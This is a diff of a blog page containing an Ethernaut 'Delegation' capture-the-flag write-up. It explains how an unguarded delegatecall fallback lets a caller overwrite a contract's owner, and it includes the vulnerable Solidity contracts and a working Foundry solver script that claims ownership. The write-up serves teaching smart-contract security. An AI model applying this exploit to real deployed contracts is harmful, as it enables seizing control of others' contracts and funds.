@@ -1,139 +1,382 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Delegation - Koyphshi</title><meta name=description content="Exploiting delegatecall to claim ownership of a Delegation contract"><meta property="og:url" content="https://lanaceryasser.github.io/ethernaut/delegation/"><meta property="og:site_name" content="Koyphshi"><meta property="og:title" content="Delegation"><meta property="og:description" content="Exploiting delegatecall to claim ownership of a Delegation contract"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="ethernaut"><meta property="article:published_time" content="2026-01-07T00:00:00+00:00"><meta property="article:modified_time" content="2026-01-07T00:00:00+00:00"><meta property="article:tag" content="Ethernaut"><meta property="article:tag" content="Solidity"><meta property="article:tag" content="Delegatecall"><meta property="article:tag" content="Evm"><meta property="article:tag" content="Storage-Slots"><meta property="og:image" content="https://lanaceryasser.github.io/avatar/avatar.gif"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://lanaceryasser.github.io/avatar/avatar.gif"><meta name=twitter:title content="Delegation"><meta name=twitter:description content="Exploiting delegatecall to claim ownership of a Delegation contract"><meta name=application-name content="Koyphshi"><meta name=apple-mobile-web-app-title content="Koyphshi"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://lanaceryasser.github.io/ethernaut/delegation/><link rel=prev href=https://lanaceryasser.github.io/ethernaut/force/><link rel=next href=https://lanaceryasser.github.io/ethernaut/elevator/><link rel=stylesheet href=/css/page.min.css><link rel=stylesheet href=/css/home.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Delegation","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/lanaceryasser.github.io\/ethernaut\/delegation\/"},"image":["https:\/\/lanaceryasser.github.io\/avatar\/avatar.gif"],"genre":"ethernaut","keywords":"ethernaut, solidity, delegatecall, evm, storage-slots","wordcount":731,"url":"https:\/\/lanaceryasser.github.io\/ethernaut\/delegation\/","datePublished":"2026-01-07T00:00:00+00:00","dateModified":"2026-01-07T00:00:00+00:00","publisher":{"@type":"Organization","name":"Koyphshi"},"author":{"@type":"Person","name":"Koyphshi"},"description":"Exploiting delegatecall to claim ownership of a Delegation contract"}</script></head><body data-header-desktop=sticky data-header-mobile=auto><script>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Koyphshi>Koyphshi</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts
-</a><a class=menu-item href=/categories/>Categories
-</a><a class=menu-item href=/tags/>Tags
-</a><a class=menu-item href=/posts/ethernaut/>Ethernaut
-</a><a class=menu-item href=/about/>About
-</a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
-<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
-<a href=# class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fa-solid fa-search fa-fw"></i>
-</a><a href=# class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fa-solid fa-times-circle fa-fw"></i>
-</a><span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin"></i>
-</span></span><a href=# onclick=return!1 class="menu-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Koyphshi>Koyphshi</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
-<a href=# class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fa-solid fa-search fa-fw"></i>
-</a><a href=# class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fa-solid fa-times-circle fa-fw"></i>
-</a><span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin"></i></span></div><a href=# class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/posts/ethernaut/ title>Ethernaut</a><a class=menu-item href=/about/ title>About</a><div class=menu-item><a href=# onclick=return!1 class=theme-switch title="Switch Theme"><i class="fa-solid fa-adjust fa-fw"></i></a></div></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto style=top:8rem><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single special" data-toc=enable><h2 class="single-title animated fadeInDown faster">Delegation</h2><div class=single-card><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
-<span><i class="details-icon fa-solid fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents></nav></div></div><div class=content id=content><p>in this challenge we are given the code for 2 contracts and our goal is to claim ownership for the given contract instance</p><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-info-circle fa-fw"></i>Challenge Info<i class="details-icon fa-solid fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content><ul><li><strong>Platform</strong>: Ethernaut</li><li><strong>Challenge</strong>: Delegation</li><li><strong>Category</strong>: Blockchain</li></ul></div></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
-</span><span class=lnt> 2
-</span><span class=lnt> 3
-</span><span class=lnt> 4
-</span><span class=lnt> 5
-</span><span class=lnt> 6
-</span><span class=lnt> 7
-</span><span class=lnt> 8
-</span><span class=lnt> 9
-</span><span class=lnt>10
-</span><span class=lnt>11
-</span><span class=lnt>12
-</span><span class=lnt>13
-</span><span class=lnt>14
-</span><span class=lnt>15
-</span><span class=lnt>16
-</span><span class=lnt>17
-</span><span class=lnt>18
-</span><span class=lnt>19
-</span><span class=lnt>20
-</span><span class=lnt>21
-</span><span class=lnt>22
-</span><span class=lnt>23
-</span><span class=lnt>24
-</span><span class=lnt>25
-</span><span class=lnt>26
-</span><span class=lnt>27
-</span><span class=lnt>28
-</span><span class=lnt>29
-</span><span class=lnt>30
-</span><span class=lnt>31
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
-</span></span></span><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Delegate</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=n>owner</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_owner</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=n>owner</span> <span class=o>=</span> <span class=n>_owner</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>pwn</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Delegation</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=n>owner</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=n>Delegate</span> <span class=n>delegate</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_delegateAddress</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=n>delegate</span> <span class=o>=</span> <span class=n>Delegate</span><span class=p>(</span><span class=n>_delegateAddress</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>        <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=n>fallback</span><span class=p>()</span> <span class=k>external</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=kt>bool</span> <span class=n>result</span><span class=p>,)</span> <span class=o>=</span> <span class=kt>address</span><span class=p>(</span><span class=n>delegate</span><span class=p>).</span><span class=nb>delegatecall</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>            <span class=nb>this</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></td></tr></table></div></div><p>the challenge description tell us to learn about the <code>delegatecall</code> low level function</p><p>we should understand when a contract make an external call to an another contract there are 3 types of calls that can happen : call, delegate call and static call</p><p>when a call is created it starts an <code>execution context</code></p><p>the execution context is simply the environment in the <code>evm</code> where the function runs, it determines the state variables we can access and many other things</p><p>when working with delegate calls the function runs in the context of the contract that is making the call , so if contract A calls contract B , contract B can access the state variables of contract A , this is useful in certain cases but can be dangerous too</p><p>getting back to our challenge lets first determine which contract instance we have</p><p>this is the <code>bytecode</code> for the contract address we have :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://lanaceryasser.github.io/ethernaut/delegation/bytecode.png data-srcset="https://lanaceryasser.github.io/ethernaut/delegation/bytecode.png, https://lanaceryasser.github.io/ethernaut/delegation/bytecode.png 1.5x, https://lanaceryasser.github.io/ethernaut/delegation/bytecode.png 2x" data-sizes=auto alt=https://lanaceryasser.github.io/ethernaut/delegation/bytecode.png title=https://lanaceryasser.github.io/ethernaut/delegation/bytecode.png></p><p>now we check if the function selector for the function <code>pwn()</code> is in it or not</p><p>1- if the selector is in the code then we are given the address for <code>Delegate</code>
-2- otherwise we are given the address for <code>Delegation</code></p><p>we check that using python :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://lanaceryasser.github.io/ethernaut/delegation/selector-check.png data-srcset="https://lanaceryasser.github.io/ethernaut/delegation/selector-check.png, https://lanaceryasser.github.io/ethernaut/delegation/selector-check.png 1.5x, https://lanaceryasser.github.io/ethernaut/delegation/selector-check.png 2x" data-sizes=auto alt=https://lanaceryasser.github.io/ethernaut/delegation/selector-check.png title=https://lanaceryasser.github.io/ethernaut/delegation/selector-check.png></p><p>since it returned False we can confirm that we have the address for the Delegation contract and we should claim ownership of this contract</p><p>In solidity state variables are laid in slots, each slot is 32 bytes</p><p>when contract A delegates to contract B, B code will run but treats A storage as its own</p><p>if B have 5 state variables defined, when the code is running, if it modifies the first state variable this will overrides A storage slot 0 , if we modify the 2nd state variable it overrides storage slot 1 , and so on</p><p>so if we trigger the fallback function of contract A</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span><span class=lnt>4
-</span><span class=lnt>5
-</span><span class=lnt>6
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=n>fallback</span><span class=p>()</span> <span class=k>external</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=kt>bool</span> <span class=n>result</span><span class=p>,)</span> <span class=o>=</span> <span class=kt>address</span><span class=p>(</span><span class=n>delegate</span><span class=p>).</span><span class=nb>delegatecall</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>data</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>            <span class=nb>this</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span></code></pre></td></tr></table></div></div><p>this will delegates to contract B , if we set <code>msg.data</code> to the function selector of <code>pwn()</code>
-this way the function pwn will get executed in context of contract A, so the value given to the state variable <code>owner</code> of contract B will be set to the storage slot 0 of contract A , and what state variable of A we have in the slot 0 ?</p><p>Yes <code>owner</code> !!! , so we claim ownership</p><p>now to make this exploit complete, lets recall when fallback is called</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://lanaceryasser.github.io/ethernaut/delegation/fallback-flow.png data-srcset="https://lanaceryasser.github.io/ethernaut/delegation/fallback-flow.png, https://lanaceryasser.github.io/ethernaut/delegation/fallback-flow.png 1.5x, https://lanaceryasser.github.io/ethernaut/delegation/fallback-flow.png 2x" data-sizes=auto alt=https://lanaceryasser.github.io/ethernaut/delegation/fallback-flow.png title=https://lanaceryasser.github.io/ethernaut/delegation/fallback-flow.png></p><p>just add a note that in the case where <code>msg.data</code> is not empty
-fallback get executed only if the given selector don&rsquo;t match any function signature that exists in the contract code</p><p>so if we pass <code>msg.data = selector of pwn()</code> since this matches no function in contract A, fallback will get executed, and it will delegate calls the function <code>pwn()</code> of contract B because of this line :</p><p><code>(bool result,) = address(delegate).delegatecall(msg.data);</code></p><p>and one important last note to add is that running the execution of this call , <code>msg.sender</code> will be our address , not the contract A address , because this is how delegate call works</p><p>now we create the solver script using forge script :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
-</span><span class=lnt> 2
-</span><span class=lnt> 3
-</span><span class=lnt> 4
-</span><span class=lnt> 5
-</span><span class=lnt> 6
-</span><span class=lnt> 7
-</span><span class=lnt> 8
-</span><span class=lnt> 9
-</span><span class=lnt>10
-</span><span class=lnt>11
-</span><span class=lnt>12
-</span><span class=lnt>13
-</span><span class=lnt>14
-</span><span class=lnt>15
-</span><span class=lnt>16
-</span><span class=lnt>17
-</span><span class=lnt>18
-</span><span class=lnt>19
-</span><span class=lnt>20
-</span><span class=lnt>21
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
-</span></span></span><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;../src/Delegation.sol&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/Script.sol&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/console.sol&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Solver</span> <span class=k>is</span> <span class=n>Script</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=n>Delegation</span> <span class=n>instance</span> <span class=o>=</span> <span class=n>Delegation</span><span class=p>(</span><span class=mh>0xc8265024cb3Ba61f254368EcBe9e131DFdf21eE3</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>run</span><span class=p>()</span> <span class=k>external</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>     <span class=n>vm</span><span class=p>.</span><span class=n>startBroadcast</span><span class=p>(</span><span class=n>vm</span><span class=p>.</span><span class=n>envUint</span><span class=p>(</span><span class=s>&#34;PRIVATE_KEY&#34;</span><span class=p>));</span>
-</span></span><span class=line><span class=cl>     <span class=n>console</span><span class=p>.</span><span class=n>log</span><span class=p>(</span><span class=n>instance</span><span class=p>.</span><span class=n>owner</span><span class=p>());</span>
-</span></span><span class=line><span class=cl>     <span class=p>(</span><span class=kt>bool</span> <span class=n>result</span> <span class=p>,</span> <span class=p>)</span> <span class=o>=</span> <span class=kt>address</span><span class=p>(</span><span class=n>instance</span><span class=p>).</span><span class=nb>call</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodeWithSignature</span><span class=p>(</span><span class=s>&#34;pwn()&#34;</span><span class=p>));</span>
-</span></span><span class=line><span class=cl>     <span class=n>console</span><span class=p>.</span><span class=n>log</span><span class=p>(</span><span class=n>result</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>     <span class=n>console</span><span class=p>.</span><span class=n>log</span><span class=p>(</span><span class=n>instance</span><span class=p>.</span><span class=n>owner</span><span class=p>());</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>  <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></td></tr></table></div></div><p>after running this locally :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://lanaceryasser.github.io/ethernaut/delegation/solution-success.png data-srcset="https://lanaceryasser.github.io/ethernaut/delegation/solution-success.png, https://lanaceryasser.github.io/ethernaut/delegation/solution-success.png 1.5x, https://lanaceryasser.github.io/ethernaut/delegation/solution-success.png 2x" data-sizes=auto alt=https://lanaceryasser.github.io/ethernaut/delegation/solution-success.png title=https://lanaceryasser.github.io/ethernaut/delegation/solution-success.png></p><p>we can see that we claimed ownership successfully so GG! the challenge is solved</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-tag><span><a href=/tags/ethernaut/>Ethernaut</a>
-</span><span><a href=/tags/solidity/>Solidity</a>
-</span><span><a href=/tags/delegatecall/>Delegatecall</a>
-</span><span><a href=/tags/evm/>Evm</a>
-</span><span><a href=/tags/storage-slots/>Storage-Slots</a></span></div><div class=post-info-line><div class=post-info-mod><span>Updated on 2026-01-07</span></div><div class=post-info-mod></div></div><div class=post-info-share><span><a href=# onclick=return!1 title="Share on Facebook" data-sharer=facebook data-url=https://lanaceryasser.github.io/ethernaut/delegation/ data-hashtag=ethernaut><i class="fa-brands fa-facebook-square fa-fw"></i></a><a href=# onclick=return!1 title="Share on Linkedin" data-sharer=linkedin data-url=https://lanaceryasser.github.io/ethernaut/delegation/><i class="fa-brands fa-linkedin fa-fw"></i></a></span></div></div><div class=related-content><h3 class=related-title>See Also</h3><div class=related-posts><a class=related-post href=/posts/ethernaut/><div class=related-post-image-placeholder><i class="fa-solid fa-newspaper"></i></div><div class=related-post-content><span class=related-post-title>Ethernaut</span></div></a><a class=related-post href=/ethernaut/force/><div class=related-post-image-placeholder><i class="fa-solid fa-newspaper"></i></div><div class=related-post-content><span class=related-post-title>Force</span></div></a><a class=related-post href=/ethernaut/gatekeeper-one/><div class=related-post-image-placeholder><i class="fa-solid fa-newspaper"></i></div><div class=related-post-content><span class=related-post-title>Gatekeeper One</span></div></a><a class=related-post href=/ethernaut/magic-number/><div class=related-post-image-placeholder><i class="fa-solid fa-newspaper"></i></div><div class=related-post-content><span class=related-post-title>Magic Number</span></div></a><a class=related-post href=/ethernaut/token/><div class=related-post-image-placeholder><i class="fa-solid fa-newspaper"></i></div><div class=related-post-content><span class=related-post-title>Token</span></div></a></div></div><div class=post-nav><a href=/ethernaut/force/ class=prev rel=prev title=Force><i class="fa-solid fa-angle-left fa-fw"></i>Previous Post</a>
-<a href=/ethernaut/elevator/ class=next rel=next title=Elevator>Next Post<i class="fa-solid fa-angle-right fa-fw"></i></a></div></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.164.0 (ce2470e7012b5ab5fc4e10ebe4027e9f8d9e00dc)">Hugo</a> | Theme - <a href=https://github.com/khusika/FeelIt target=_blank rel="noopener noreffer" title="FeelIt 1.0.3"><i class="fa-solid fa-hand-holding-heart fa-fw"></i> FeelIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw"></i><span itemprop=copyrightYear>2024 - 2026</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/>Koyphshi</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fa-solid fa-chevron-up fa-fw"></i></a></div><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=stylesheet href=/lib/katex/copy-tex.min.css><link rel=stylesheet href=/css/custom.css><script src=/lib/autocomplete/autocomplete.min.js></script><script src=/lib/lunr/lunr.min.js></script><script src=/lib/lazysizes/lazysizes.min.js></script><script src=/lib/clipboard/clipboard.min.js></script><script src=/lib/sharer/sharer.min.js></script><script src=/lib/katex/katex.min.js></script><script src=/lib/katex/auto-render.min.js></script><script src=/lib/katex/copy-tex.min.js></script><script src=/lib/katex/mhchem.min.js></script><script>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script src=/js/theme.min.js></script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Delegation - Koyphshi</title><meta name="description" content="Exploiting delegatecall to claim ownership of a Delegation contract"><meta property="og:url" content="http://localhost:1313/ethernaut/delegation/">
+	<meta property="og:site_name" content="Koyphshi">
+	<meta property="og:title" content="Delegation">
+	<meta property="og:description" content="Exploiting delegatecall to claim ownership of a Delegation contract">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="ethernaut">
+		<meta property="article:published_time" content="2026-01-07T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-01-07T00:00:00+00:00">
+		<meta property="article:tag" content="Ethernaut">
+		<meta property="article:tag" content="Solidity">
+		<meta property="article:tag" content="Delegatecall">
+		<meta property="article:tag" content="Evm">
+		<meta property="article:tag" content="Storage-Slots">
+		<meta property="og:image" content="http://localhost:1313/avatar/avatar.gif">
+
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:image" content="http://localhost:1313/avatar/avatar.gif">
+	<meta name="twitter:title" content="Delegation">
+	<meta name="twitter:description" content="Exploiting delegatecall to claim ownership of a Delegation contract">
+<meta name="application-name" content="Koyphshi">
+<meta name="apple-mobile-web-app-title" content="Koyphshi"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/ethernaut/delegation/" /><link rel="prev" href="http://localhost:1313/ethernaut/force/" /><link rel="next" href="http://localhost:1313/ethernaut/elevator/" /><link rel="stylesheet" href="/css/page.min.css"><link rel="stylesheet" href="/css/home.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Delegation",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/ethernaut\/delegation\/"
+        },"image": ["http:\/\/localhost:1313\/avatar\/avatar.gif"],"genre": "ethernaut","keywords": "ethernaut, solidity, delegatecall, evm, storage-slots","wordcount":  731 ,
+        "url": "http:\/\/localhost:1313\/ethernaut\/delegation\/","datePublished": "2026-01-07T00:00:00+00:00","dateModified": "2026-01-07T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": "Koyphshi"},"author": {
+                "@type": "Person",
+                "name": "Koyphshi"
+            },"description": "Exploiting delegatecall to claim ownership of a Delegation contract"
+    }
+    </script></head><body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Koyphshi">Koyphshi</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about/">
+                            About
+                        </a><a class="menu-item" href="/posts/">
+                            Posts
+                        </a><a class="menu-item" href="/categories/">
+                            Categories
+                        </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fa-solid fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fa-solid fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fa-solid fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fa-solid fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Koyphshi">Koyphshi</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fa-solid fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fa-solid fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fa-solid fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><div class="menu-item"><a href="#" onclick="return false;" class="theme-switch" title="Switch Theme">
+                    <i class="fa-solid fa-adjust fa-fw"></i>
+                </a>
+            </div></div>
+    </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto" style="top:8rem;">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single special" data-toc="enable"><h2 class="single-title animated fadeInDown faster">Delegation</h2><div class="single-card" ><div class="details toc" id="toc-static"  data-kept="">
+                    <div class="details-summary toc-title">
+                        <span>Contents</span>
+                        <span><i class="details-icon fa-solid fa-angle-right"></i></span>
+                    </div>
+                    <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+                </div><div class="content" id="content"><p>in this challenge we are given the code for 2 contracts and our goal is to claim ownership for the given contract instance</p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fa-solid fa-info-circle fa-fw"></i>Challenge Info<i class="details-icon fa-solid fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ul>
+<li><strong>Platform</strong>: Ethernaut</li>
+<li><strong>Challenge</strong>: Delegation</li>
+<li><strong>Category</strong>: Blockchain</li>
+</ul>
+</div>
+        </div>
+    </div>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
